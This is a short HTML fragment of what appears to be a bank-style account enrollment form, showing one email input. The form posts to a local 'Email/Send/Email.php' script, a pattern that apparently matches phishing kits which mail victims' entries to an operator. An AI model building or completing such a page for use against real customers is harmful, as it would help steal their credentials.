...
<body>
<form action="./Email/Send/Email.php" method="post"><div class="mtb-app-enrollment">
...
</div>        <div data-parentFor="email" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
            <label for="email">Email Address</label>
            <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="letters" placeholder=""  type="text" id="email" name="email" data-inputType="text" required >
